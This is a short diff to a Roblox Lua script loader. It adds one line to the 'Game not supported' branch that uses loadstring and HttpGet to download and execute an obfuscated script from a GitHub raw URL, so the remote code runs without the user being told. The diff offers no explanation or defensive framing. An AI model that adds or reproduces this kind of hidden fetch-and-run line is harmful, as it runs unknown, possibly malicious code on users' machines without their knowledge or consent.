@@ -36,6 +36,7 @@ if LoaderConfig.SupportedGames[currentPlaceId] then
         })
     end
 else
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aleksmago1/shadowhub/refs/heads/main/obfuscated_script-1752393404500.lua.txt"))()
     game:GetService("StarterGui"):SetCore("SendNotification", {
         Title = LoaderConfig.NotificationSettings.Title,
         Text = "Game not supported",
